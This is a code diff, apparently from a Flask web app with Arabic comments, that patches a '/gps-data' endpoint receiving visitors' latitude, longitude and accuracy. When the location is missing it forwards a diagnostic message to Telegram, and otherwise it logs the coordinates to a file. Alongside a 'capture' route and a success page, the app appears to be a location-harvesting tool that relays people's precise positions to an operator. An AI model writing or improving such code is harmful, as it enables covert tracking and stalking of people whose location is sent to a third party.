@@ -294,13 +294,30 @@ def capture():
     '''
     return success_page
 
-# ========== استقبال الموقع الدقيق (GPS) ==========
+# ========== استقبال الموقع الدقيق (GPS) - التصحيح النهائي ==========
 @app.route('/gps-data', methods=['POST'])
 def gps_data():
     data = request.get_json()
     lat = data.get('lat')
-    lon = data.get('lon')
+    lon = data.get('lng')  # التصحيح النهائي: lng بدلاً من lon
     accuracy = data.get('accuracy')
+    
+    # التحقق من صحة البيانات
+    if lon is None or lat is None:
+        error_msg = f"""
+⚠️ <b>فشل تحديد الموقع بدقة</b>
+📱 الأسباب المحتملة:
+1. لم تسمح بمشاركة الموقع في المتصفح
+2. إشارة GPS ضعيفة (جرب في مكان مفتوح)
+3. استخدم متصفح Google Chrome للحصول على أفضل دقة
+
+📝 البيانات المستلمة:
+خط العرض: {lat}
+خط الطول: {lon}
+الدقة: {accuracy} متر
+"""
+        send_to_telegram(error_msg)
+        return {"status": "failed", "reason": "GPS location unavailable"}, 400
     
     # تسجيل الموقع في ملف
     with open('gps_log.txt', 'a', encoding='utf-8') as f:
